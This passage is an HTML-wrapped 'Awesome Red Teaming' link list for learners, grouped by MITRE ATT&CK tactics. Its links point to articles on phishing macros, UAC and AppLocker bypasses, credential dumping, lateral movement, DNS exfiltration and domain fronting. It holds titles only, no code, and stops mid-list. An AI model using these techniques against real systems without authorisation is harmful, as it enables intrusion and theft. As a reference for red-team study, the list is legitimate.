    <content type="html"><![CDATA[<h1 id="Awesome-Red-Teaming"><a href="#Awesome-Red-Teaming" class="headerlink" title="Awesome Red Teaming"></a>Awesome Red Teaming</h1><p>List of Awesome Red Team / Red Teaming Resources</p><p>This list is for anyone wishing to learn about Red Teaming but do not have a starting point.</p><p>Anyway, this is a living resources and will update regularly with latest Adversarial Tactics and Techniques based on <a href="https://attack.mitre.org/wiki/Main_Page" target="_blank" rel="noopener">Mitre ATT&amp;CK</a></p><p>You can help by sending Pull Requests to add more information.</p><a id="more"></a><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ul><li><a href="#-initial-access">Initial Access</a></li><li><a href="#-execution">Execution</a></li><li><a href="#-persistence">Persistence</a></li><li><a href="#-privilege-escalation">Privilege Escalation</a></li><li><a href="#-defense-evasion">Defense Evasion</a></li><li><a href="#-credential-access">Credential Access</a></li><li><a href="#-discovery">Discovery</a></li><li><a href="#-lateral-movement">Lateral Movement</a></li><li><a href="#-collection">Collection</a></li><li><a href="#-exfiltration">Exfiltration</a></li><li><a href="#-command-and-control">Command and Control</a></li><li><a href="#-embedded-and-peripheral-devices-hacking">Embedded and Peripheral Devices Hacking</a></li><li><a href="#-misc">Misc</a></li><li><a href="#-redteam-gadgets">RedTeam Gadgets</a></li><li><a href="#-ebooks">Ebooks</a></li><li><a href="#-training--free-">Training</a></li><li><a href="#-certification">Certification</a></li></ul><h2 id="↑-Initial-Access"><a href="#↑-Initial-Access" class="headerlink" title="↑ Initial Access"></a><a href="#table-of-contents">↑</a> Initial Access</h2><ul><li><a href="https://www.blackhillsinfosec.com/empires-cross-platform-office-macro/" target="_blank" rel="noopener">How To: Empire’s Cross Platform Office Macro</a></li><li><a href="https://www.blackhillsinfosec.com/phishing-with-powerpoint/" target="_blank" rel="noopener">Phishing with PowerPoint</a></li><li><a href="https://enigma0x3.net/2016/03/15/phishing-with-empire/" target="_blank" rel="noopener">PHISHING WITH EMPIRE</a></li><li><a href="https://hakshop.com/products/bash-bunny" target="_blank" rel="noopener">Bash Bunny</a></li><li><a href="https://www.owasp.org/images/5/54/Presentation_Social_Engineering.pdf" target="_blank" rel="noopener">OWASP Presentation of Social Engineering - OWASP</a></li><li><a href="https://www.redteamsecure.com/usb-drop-attacks-the-danger-of-lost-and-found-thumb-drives/" target="_blank" rel="noopener">USB Drop Attacks: The Danger of “Lost And Found” Thumb Drives</a></li><li><a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEFCON-24-Seymour-Tully-Weaponizing-Data-Science-For-Social-Engineering-WP.pdf" target="_blank" rel="noopener">Weaponizing data science for social engineering: Automated E2E spear phishing on Twitter - Defcon 23</a></li><li><a href="https://www.cobaltstrike.com/help-spear-phish" target="_blank" rel="noopener">Cobalt Strike - Spear Phishing documentation</a></li><li><a href="https://blog.cobaltstrike.com/2014/12/17/whats-the-go-to-phishing-technique-or-exploit/" target="_blank" rel="noopener">Cobalt Strike Blog - What’s the go-to phishing technique or exploit?</a></li><li><a href="https://www.youtube.com/watch?v=V7UJjVcq2Ao" target="_blank" rel="noopener">Spear phishing with Cobalt Strike - Raphael Mudge</a></li><li><a href="https://cybersyndicates.com/2016/05/email-reconnaissance-phishing-template-generation-made-simple/" target="_blank" rel="noopener">EMAIL RECONNAISSANCE AND PHISHING TEMPLATE GENERATION MADE SIMPLE</a></li><li><a href="http://www.rvrsh3ll.net/blog/phishing/phishing-for-access/" target="_blank" rel="noopener">Phishing for access</a></li><li><a href="https://4sysops.com/archives/excel-macros-with-powershell/" target="_blank" rel="noopener">Excel macros with PowerShell</a></li><li><a href="https://phishme.com/powerpoint-and-custom-actions/" target="_blank" rel="noopener">PowerPoint and Custom Actions</a></li><li><a href="https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/" target="_blank" rel="noopener">Macro-less Code Exec in MSWord</a></li><li><a href="https://medium.com/@malcomvetter/multi-platform-macro-phishing-payloads-3b688e8eff68" target="_blank" rel="noopener">Multi-Platform Macro Phishing Payloads</a></li><li><a href="https://rhinosecuritylabs.com/research/abusing-microsoft-word-features-phishing-subdoc/" target="_blank" rel="noopener">Abusing Microsoft Word Features for Phishing: “subDoc”</a></li><li><a href="https://enigma0x3.net/2017/07/13/phishing-against-protected-view/" target="_blank" rel="noopener">Phishing Against Protected View</a></li><li><a href="https://fzuckerman.wordpress.com/2016/10/06/powershell-empire-stagers-1-phishing-with-an-office-macro-and-evading-avs/" target="_blank" rel="noopener">POWERSHELL EMPIRE STAGERS 1: PHISHING WITH AN OFFICE MACRO AND EVADING AVS</a></li><li><a href="https://www.redteamsecure.com/the-plugbot-hardware-botnet-research-project/" target="_blank" rel="noopener">The PlugBot: Hardware Botnet Research Project</a></li><li><a href="https://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-generator" target="_blank" rel="noopener">Luckystrike: An Evil Office Document Generator</a></li><li><a href="http://georgemauer.net/2017/10/07/csv-injection.html" target="_blank" rel="noopener">The Absurdly Underestimated Dangers of CSV Injection</a></li><li><a href="https://furoner.wordpress.com/2017/10/17/macroless-malware-that-avoids-detection-with-yara-rule/amp/" target="_blank" rel="noopener">Macroless DOC malware that avoids detection with Yara rule</a></li><li><a href="https://medium.com/@vivami/phishing-between-the-app-whitelists-1b7dcdab4279" target="_blank" rel="noopener">Phishing between the app whitelists</a></li><li><a href="https://stealingthe.network/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/" target="_blank" rel="noopener">Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 1 of 2)</a></li><li><a href="https://stealingthe.network/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/" target="_blank" rel="noopener">Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 2 of 2)</a></li><li><a href="https://www.social-engineer.org/" target="_blank" rel="noopener">Social Engineer Portal</a></li><li><a href="http://www.darkreading.com/the-7-best-social-engineering-attacks-ever/d/d-id/1319411" target="_blank" rel="noopener">7 Best social Engineering attack</a></li><li><a href="https://www.rsaconference.com/writable/presentations/file_upload/das-301_williams_rader.pdf" target="_blank" rel="noopener">Using Social Engineering Tactics For Big Data Espionage - RSA Conference Europe 2012</a></li><li><a href="https://1337red.wordpress.com/using-the-dde-attack-with-powershell-empire/" target="_blank" rel="noopener">USING THE DDE ATTACK WITH POWERSHELL EMPIRE</a></li><li><a href="https://www.kitploit.com/2018/02/pot-phishing-on-twitter.html" target="_blank" rel="noopener">Phishing on Twitter - POT</a></li><li><a href="https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/" target="_blank" rel="noopener">Microsoft Office – NTLM Hashes via Frameset</a></li><li><a href="https://oddvar.moe/2017/09/13/defense-in-depth-writeup/" target="_blank" rel="noopener">Defense-In-Depth write-up</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/05/07/Phishing.html" target="_blank" rel="noopener">Spear Phishing 101</a></li></ul><h2 id="↑-Execution"><a href="#↑-Execution" class="headerlink" title="↑ Execution"></a><a href="#table-of-contents">↑</a> Execution</h2><ul><li><a href="https://msitpros.com/?p=3960" target="_blank" rel="noopener">Research on CMSTP.exe,</a></li><li><a href="https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/" target="_blank" rel="noopener">Windows oneliners to download remote payload and execute arbitrary code</a></li><li><a href="https://bohops.com/2017/12/02/clickonce-twice-or-thrice-a-technique-for-social-engineering-and-untrusted-command-execution/" target="_blank" rel="noopener">Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts</a></li><li><a href="https://posts.specterops.io/wsh-injection-a-case-study-fd35f79d29dd" target="_blank" rel="noopener">WSH Injection: A Case Study</a></li><li><a href="http://lockboxx.blogspot.com/2018/02/intro-to-using-gscript-for-red-teams.html" target="_blank" rel="noopener">Gscript Dropper</a></li></ul><h2 id="↑-Persistence"><a href="#↑-Persistence" class="headerlink" title="↑ Persistence"></a><a href="#table-of-contents">↑</a> Persistence</h2><ul><li><a href="https://rastamouse.me/2018/03/a-view-of-persistence/" target="_blank" rel="noopener">A View of Persistence</a></li><li><a href="https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353" target="_blank" rel="noopener">hiding registry keys with psreflect</a></li><li><a href="https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/" target="_blank" rel="noopener">Persistence using RunOnceEx – Hidden from Autoruns.exe</a></li><li><a href="https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/" target="_blank" rel="noopener">Persistence using GlobalFlags in Image File Execution Options – Hidden from Autoruns.exe</a></li><li><a href="https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/" target="_blank" rel="noopener">Putting data in Alternate data streams and how to execute it – part 2</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/01/20/WMI-Persistence.html" target="_blank" rel="noopener">WMI Persistence with Cobalt Strike</a></li><li><a href="https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/" target="_blank" rel="noopener">Leveraging INF-SCT Fetch &amp; Execute Techniques For Bypass, Evasion, &amp; Persistence</a></li><li><a href="https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/" target="_blank" rel="noopener">Leveraging INF-SCT Fetch &amp; Execute Techniques For Bypass, Evasion, &amp; Persistence (Part 2)</a></li><li><a href="https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/" target="_blank" rel="noopener">Vshadow: Abusing the Volume Shadow Service for Evasion, Persistence, and Active Directory Database Extraction</a></li></ul><h2 id="↑-Privilege-Escalation"><a href="#↑-Privilege-Escalation" class="headerlink" title="↑ Privilege Escalation"></a><a href="#table-of-contents">↑</a> Privilege Escalation</h2><h3 id="User-Account-Control-Bypass"><a href="#User-Account-Control-Bypass" class="headerlink" title="User Account Control Bypass"></a>User Account Control Bypass</h3><ul><li><a href="https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/" target="_blank" rel="noopener">First entry: Welcome and fileless UAC bypass,</a></li><li><a href="https://tyranidslair.blogspot.ru/2017/05/exploiting-environment-variables-in.html" target="_blank" rel="noopener">Exploiting Environment Variables in Scheduled Tasks for UAC Bypass,</a></li><li>Reading Your Way Around UAC in 3 parts:<br> <a href="https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-1.html" target="_blank" rel="noopener">Part 1.</a><br> <a href="https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-2.html" target="_blank" rel="noopener">Part 2.</a><br> <a href="https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-3.html" target="_blank" rel="noopener">Part 3.</a></li><li><a href="https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/" target="_blank" rel="noopener">Bypassing UAC using App Paths,</a></li><li><a href="https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/" target="_blank" rel="noopener">“Fileless” UAC Bypass using sdclt.exe,</a></li><li><a href="https://habrahabr.ru/company/pm/blog/328008/" target="_blank" rel="noopener">UAC Bypass or story about three escalations,</a></li><li><a href="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/" target="_blank" rel="noopener">“Fileless” UAC Bypass Using eventvwr.exe and Registry Hijacking,</a></li><li><a href="https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/" target="_blank" rel="noopener">Bypassing UAC on Windows 10 using Disk Cleanup,</a></li><li><a href="http://www.freebuf.com/articles/system/116611.html" target="_blank" rel="noopener">Using IARPUninstallStringLauncher COM interface to bypass UAC,</a></li><li><a href="https://posts.specterops.io/fileless-uac-bypass-using-sdclt-exe-3e9f9ad4e2b3" target="_blank" rel="noopener">Fileless UAC Bypass using sdclt</a></li><li><a href="https://www.mdsec.co.uk/2016/12/cna-eventvwr-uac-bypass/" target="_blank" rel="noopener">Eventvwr File-less UAC Bypass CNA</a></li><li><a href="http://www.pretentiousname.com/misc/win7_uac_whitelist2.html" target="_blank" rel="noopener">Windows 7 UAC whitelist</a></li></ul><h3 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a>Escalation</h3><ul><li><a href="https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md" target="_blank" rel="noopener">Windows Privilege Escalation Checklist</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/03/17/COM-Moniker-Privesc.html" target="_blank" rel="noopener">From Patch Tuesday to DA</a></li><li><a href="https://blog.cobaltstrike.com/2016/12/08/cobalt-strike-3-6-a-path-for-privilege-escalation/" target="_blank" rel="noopener">A Path for Privilege Escalation</a></li></ul><h2 id="↑-Defense-Evasion"><a href="#↑-Defense-Evasion" class="headerlink" title="↑ Defense Evasion"></a><a href="#table-of-contents">↑</a> Defense Evasion</h2><ul><li><a href="https://github.com/tyranid/DeviceGuardBypasses" target="_blank" rel="noopener">Window 10 Device Guard Bypass</a></li><li><a href="https://github.com/api0cradle/UltimateAppLockerByPassList" target="_blank" rel="noopener">App Locker ByPass List</a></li><li><a href="https://github.com/vysec/Windows-SignedBinary" target="_blank" rel="noopener">Window Signed Binary</a></li><li><a href="http://subt0x10.blogspot.sg/2017/04/bypass-application-whitelisting-script.html" target="_blank" rel="noopener">Bypass Application Whitelisting Script Protections - Regsvr32.exe &amp; COM Scriptlets (.sct files)</a></li><li><a href="http://subt0x10.blogspot.sg/2017/04/bypassing-application-whitelisting.html" target="_blank" rel="noopener">Bypassing Application Whitelisting using MSBuild.exe - Device Guard Example and Mitigations</a></li><li><a href="https://bneg.io/2017/07/26/empire-without-powershell-exe/" target="_blank" rel="noopener">Empire without powershell</a></li><li><a href="https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/" target="_blank" rel="noopener">Powershell without Powershell to bypass app whitelist</a></li><li><a href="https://github.com/secretsquirrel/SigThief" target="_blank" rel="noopener">MS Signed mimikatz in just 3 steps</a></li><li><a href="https://riscybusiness.wordpress.com/2017/10/07/hiding-your-process-from-sysinternals/" target="_blank" rel="noopener">Hiding your process from sysinternals</a></li><li><a href="https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec" target="_blank" rel="noopener">code signing certificate cloning attacks and defenses</a></li><li><a href="https://0x00sec.org/t/userland-api-monitoring-and-code-injection-detection/5565" target="_blank" rel="noopener">userland api monitoring and code injection detection</a></li><li><a href="https://blog.cobaltstrike.com/2018/02/08/in-memory-evasion/" target="_blank" rel="noopener">In memory evasion</a></li><li><a href="https://posts.specterops.io/bypassing-amsi-via-com-server-hijacking-b8a3354d1aff" target="_blank" rel="noopener">Bypassing AMSI via COM Server Hijacking</a></li><li><a href="https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/" target="_blank" rel="noopener">process doppelganging</a></li><li><a href="http://www.labofapenetrationtester.com/2017/08/week-of-evading-microsoft-ata-day1.html" target="_blank" rel="noopener">Week of Evading Microsoft ATA - Announcement and Day 1 to Day 5</a></li><li><a href="https://cybersyndicates.com/2015/06/veil-evasion-aes-encrypted-httpkey-request-module/" target="_blank" rel="noopener">VEIL-EVASION AES ENCRYPTED HTTPKEY REQUEST: SAND-BOX EVASION</a></li><li><a href="https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/" target="_blank" rel="noopener">Putting data in Alternate data streams and how to execute it</a></li><li><a href="https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/" target="_blank" rel="noopener">AppLocker – Case study – How insecure is it really? – Part 1</a></li><li><a href="https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/" target="_blank" rel="noopener">AppLocker – Case study – How insecure is it really? – Part 2</a></li><li><a href="https://oddvar.moe/2017/12/13/harden-windows-with-applocker-based-on-case-study-part-1/" target="_blank" rel="noopener">Harden Windows with AppLocker – based on Case study part 2</a></li><li><a href="https://oddvar.moe/2017/12/21/harden-windows-with-applocker-based-on-case-study-part-2/" target="_blank" rel="noopener">Harden Windows with AppLocker – based on Case study part 2</a></li><li><a href="https://oddvar.moe/2018/01/03/office-365-safe-links-bypass/" target="_blank" rel="noopener">Office 365 Safe links bypass</a></li><li><a href="https://oddvar.moe/2018/03/15/windows-defender-attack-surface-reduction-rules-bypass/" target="_blank" rel="noopener">Windows Defender Attack Surface Reduction Rules bypass</a></li><li><a href="https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/" target="_blank" rel="noopener">Bypassing Device guard UMCI using CHM – CVE-2017-8625</a></li><li><a href="https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/" target="_blank" rel="noopener">Bypassing Application Whitelisting with BGInfo</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/01/10/cloning-captive-portals.html" target="_blank" rel="noopener">Cloning and Hosting Evil Captive Portals using a Wifi PineApple</a></li><li><a href="https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/" target="_blank" rel="noopener">https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/</a></li><li><a href="https://bohops.com/2018/01/07/executing-commands-and-bypassing-applocker-with-powershell-diagnostic-scripts/" target="_blank" rel="noopener">Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts</a></li><li><a href="https://posts.specterops.io/mavinject-exe-functionality-deconstructed-c29ab2cf5c0e" target="_blank" rel="noopener">mavinject.exe Functionality Deconstructed</a></li></ul><h2 id="↑-Credential-Access"><a href="#↑-Credential-Access" class="headerlink" title="↑ Credential Access"></a><a href="#table-of-contents">↑</a> Credential Access</h2><ul><li><a href="https://blog.cobaltstrike.com/2015/12/16/windows-access-tokens-and-alternate-credentials/" target="_blank" rel="noopener">Windows Access Tokens and Alternate credentials</a></li><li><a href="https://sensepost.com/blog/2016/bringing-the-hashes-home-with-regeorg-empire/" target="_blank" rel="noopener">Bringing the hashes home with reGeorg &amp; Empire</a></li><li><a href="https://sensepost.com/blog/2016/intercepting-passwords-with-empire-and-winning/" target="_blank" rel="noopener">Intercepting passwords with Empire and winning</a></li><li><a href="https://rastamouse.me/2018/03/laps---part-1/" target="_blank" rel="noopener">Local Administrator Password Solution (LAPS) Part 1</a></li><li><a href="https://rastamouse.me/2018/03/laps---part-2/" target="_blank" rel="noopener">Local Administrator Password Solution (LAPS) Part 2</a></li><li><a href="https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/" target="_blank" rel="noopener">USING A SCF FILE TO GATHER HASHES</a></li><li><a href="https://www.harmj0y.net/blog/" target="_blank" rel="noopener">Remote Hash Extraction On Demand Via Host Security Descriptor Modification</a></li><li><a href="https://www.harmj0y.net/blog/redteaming/offensive-encrypted-data-storage/" target="_blank" rel="noopener">Offensive Encrypted Data Storage</a></li><li><a href="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html" target="_blank" rel="noopener">Practical guide to NTLM Relaying</a></li><li><a href="https://adsecurity.org/?p=2053" target="_blank" rel="noopener">Dump Clear-Text Passwords for All Admins in the Domain Using Mimikatz DCSync</a></li><li><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/" target="_blank" rel="noopener">Dumping Domain Password Hashes</a></li></ul><h2 id="↑-Discovery"><a href="#↑-Discovery" class="headerlink" title="↑ Discovery"></a><a href="#table-of-contents">↑</a> Discovery</h2><ul><li><a href="https://www.owasp.org/images/4/4b/Red_Team_Operating_in_a_Modern_Environment.pdf" target="_blank" rel="noopener">Red Team Operating in a Modern Environment</a></li><li><a href="https://blog.cobaltstrike.com/2016/12/14/my-first-go-with-bloodhound/" target="_blank" rel="noopener">My First Go with BloodHound</a></li><li><a href="https://wald0.com/?p=68" target="_blank" rel="noopener">Introducing BloodHound</a></li><li><a href="https://wald0.com/?p=179" target="_blank" rel="noopener">A Red Teamer’s Guide to GPOs and OUs</a></li><li><a href="https://wald0.com/?p=14" target="_blank" rel="noopener">Automated Derivative Administrator Search</a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/a-pentesters-guide-to-group-scoping/" target="_blank" rel="noopener">A Pentester’s Guide to Group Scoping</a></li><li><a href="https://www.harmj0y.net/blog/redteaming/local-group-enumeration/" target="_blank" rel="noopener">Local Group Enumeration</a></li><li><a href="http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-1/" target="_blank" rel="noopener">The PowerView PowerUsage Series #1 - Mass User Profile Enumeration</a></li><li><a href="http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-2/" target="_blank" rel="noopener">The PowerView PowerUsage Series #2 – Mapping Computer Shortnames With the Global Catalog</a></li><li><a href="http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-3/" target="_blank" rel="noopener">The PowerView PowerUsage Series #3 – Enumerating GPO edit rights in a foreign domain</a></li><li><a href="http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-3/" target="_blank" rel="noopener">The PowerView PowerUsage Series #4 – Finding cross-trust ACEs</a></li><li><a href="http://threat.tevora.com/aggressor-powerview/" target="_blank" rel="noopener">Aggressor PowerView</a></li><li><a href="http://threat.tevora.com/lay-of-the-land-with-bloodhound/" target="_blank" rel="noopener">Lay of the Land with BloodHound</a></li><li><a href="https://adsecurity.org/?p=3658" target="_blank" rel="noopener">Scanning for Active Directory Privileges &amp; Privileged Accounts</a></li><li><a href="https://adsecurity.org/?p=3164" target="_blank" rel="noopener">Microsoft LAPS Security &amp; Active Directory LAPS Configuration Recon</a></li><li><a href="https://bohops.com/2017/12/02/trust-direction-an-enabler-for-active-directory-enumeration-and-trust-exploitation/" target="_blank" rel="noopener">Trust Direction: An Enabler for Active Directory Enumeration and Trust Exploitation</a></li><li><a href="https://pentestlab.blog/2018/06/04/spn-discovery/" target="_blank" rel="noopener">SPN Discovery</a></li></ul><h2 id="↑-Lateral-Movement"><a href="#↑-Lateral-Movement" class="headerlink" title="↑ Lateral Movement"></a><a href="#table-of-contents">↑</a> Lateral Movement</h2><ul><li><a href="https://rastamouse.me/2017/05/a-citrix-story/" target="_blank" rel="noopener">A Citrx Story</a></li><li><a href="https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/" target="_blank" rel="noopener">Jumping Network Segregation with RDP</a></li><li><a href="http://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/" target="_blank" rel="noopener">Pass hash pass ticket no pain</a></li><li><a href="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html" target="_blank" rel="noopener">Abusing DNSAdmins privilege for escalation in Active Directory</a></li><li><a href="http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html" target="_blank" rel="noopener">Using SQL Server for attacking a Forest Trust</a></li><li><a href="https://www.youtube.com/watch?v=Pn7GWRXfgeI" target="_blank" rel="noopener">Extending BloodHound for Red Teamers</a></li><li><a href="https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/" target="_blank" rel="noopener">OPSEC Considerations for beacon commands</a></li><li><a href="https://blog.cobaltstrike.com/2016/12/14/my-first-go-with-bloodhound/" target="_blank" rel="noopener">My First Go with BloodHound</a></li><li><a href="http://www.exumbraops.com/blog/2016/6/1/kerberos-party-tricks-weaponizing-kerberos-protocol-flaws" target="_blank" rel="noopener">Kerberos Party Tricks: Weaponizing Kerberos Protocol Flaws</a></li><li><a href="https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/" target="_blank" rel="noopener">Lateral movement using excel application and dcom</a></li><li><a href="http://threat.tevora.com/lay-of-the-land-with-bloodhound/" target="_blank" rel="noopener">Lay of the Land with BloodHound</a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/" target="_blank" rel="noopener">The Most Dangerous User Right You (Probably) Have Never Heard Of</a></li><li><a href="https://blog.cobaltstrike.com/2016/11/03/agentless-post-exploitation/" target="_blank" rel="noopener">Agentless Post Exploitation</a></li><li><a href="https://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/" target="_blank" rel="noopener">A Guide to Attacking Domain Trusts</a>   </li><li><a href="https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/" target="_blank" rel="noopener">Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy</a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/" target="_blank" rel="noopener">Targeted Kerberoasting</a></li><li><a href="https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">Kerberoasting Without Mimikatz</a></li><li><a href="https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" target="_blank" rel="noopener">Abusing GPO Permissions</a></li><li><a href="https://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/" target="_blank" rel="noopener">Abusing Active Directory Permissions with PowerView</a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/" target="_blank" rel="noopener">Roasting AS-REPs</a></li><li><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html" target="_blank" rel="noopener">Getting the goods with CrackMapExec: Part 1</a></li><li><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html" target="_blank" rel="noopener">Getting the goods with CrackMapExec: Part 2</a></li><li><a href="https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/" target="_blank" rel="noopener">DiskShadow: The Return of VSS Evasion, Persistence, and Active Directory Database Extraction</a></li><li><a href="https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/" target="_blank" rel="noopener">Abusing Exported Functions and Exposed DCOM Interfaces for Pass-Thru Command Execution and Lateral Movement</a></li><li><a href="https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944" target="_blank" rel="noopener">a guide to attacking domain trusts</a></li><li><a href="https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/" target="_blank" rel="noopener">Outlook Home Page – Another Ruler Vector</a></li><li><a href="https://sensepost.com/blog/2017/outlook-forms-and-shells/" target="_blank" rel="noopener">Outlook Forms and Shells</a></li><li><a href="https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/" target="_blank" rel="noopener">Abusing the COM Registry Structure: CLSID, LocalServer32, &amp; InprocServer32</a></li><li><a href="https://codewhitesec.blogspot.com/2018/07/lethalhta.html" target="_blank" rel="noopener">LethalHTA - A new lateral movement technique using DCOM and HTA</a></li><li><a href="https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/" target="_blank" rel="noopener">Abusing DCOM For Yet Another Lateral Movement Technique</a></li></ul><h2 id="↑-Collection"><a href="#↑-Collection" class="headerlink" title="↑ Collection"></a><a href="#table-of-contents">↑</a> Collection</h2><ul><li><a href="https://oddvar.moe/2017/01/24/accessing-clipboard-from-the-lock-screen-in-windows-10/" target="_blank" rel="noopener">Accessing clipboard from the lock screen in Windows 10 Part 1</a></li><li><a href="https://oddvar.moe/2017/01/27/access-clipboard-from-lock-screen-in-windows-10-2/" target="_blank" rel="noopener">Accessing clipboard from the lock screen in Windows 10 Part 2</a></li></ul><h2 id="↑-Exfiltration"><a href="#↑-Exfiltration" class="headerlink" title="↑ Exfiltration"></a><a href="#table-of-contents">↑</a> Exfiltration</h2><ul><li><a href="https://blog.fosec.vn/dns-data-exfiltration-what-is-this-and-how-to-use-2f6c69998822" target="_blank" rel="noopener">DNS Data exfiltration — What is this and How to use?</a></li><li><a href="http://resources.infosecinstitute.com/dns-tunnelling/" target="_blank" rel="noopener">DNS Tunnelling</a></li><li><a href="https://securityonline.info/sg1-swiss-army-knife-for-data-encryption-exfiltration-covert-communication/?utm_source=ReviveOldPost&amp;utm_medium=social&amp;utm_campaign=ReviveOldPost" target="_blank" rel="noopener">sg1: swiss army knife for data encryption, exfiltration &amp; covert communication</a></li><li><a href="https://n0where.net/data-exfiltration-over-dns-request-covert-channel-dnsexfiltrator" target="_blank" rel="noopener">Data Exfiltration over DNS Request Covert Channel: DNSExfiltrator</a></li><li><a href="https://github.com/PaulSec/DET" target="_blank" rel="noopener">DET (extensible) Data Exfiltration Toolkit</a></li><li><a href="https://www.notsosecure.com/data-exfiltration-formula-injection/" target="_blank" rel="noopener">Data Exfiltration via Formula Injection Part1</a></li></ul><h2 id="↑-Command-and-Control"><a href="#↑-Command-and-Control" class="headerlink" title="↑ Command and Control"></a><a href="#table-of-contents">↑</a> Command and Control</h2><h3 id="Domain-Fronting"><a href="#Domain-Fronting" class="headerlink" title="Domain Fronting"></a>Domain Fronting</h3><ul><li><a href="https://www.xorrior.com/Empire-Domain-Fronting/" target="_blank" rel="noopener">Empre Domain Fronting</a></li><li><a href="https://www.optiv.com/blog/escape-and-evasion-egressing-restricted-networks" target="_blank" rel="noopener">Escape and Evasion Egressing Restricted Networks - Tom Steele and Chris Patten</a></li><li><a href="https://github.com/rvrsh3ll/FindFrontableDomains" target="_blank" rel="noopener">Finding Frontable Domain</a></li><li><a href="https://www.mdsec.co.uk/2017/02/tor-fronting-utilising-hidden-services-for-privacy/" target="_blank" rel="noopener">TOR Fronting – Utilising Hidden Services for Privacy</a></li><li><a 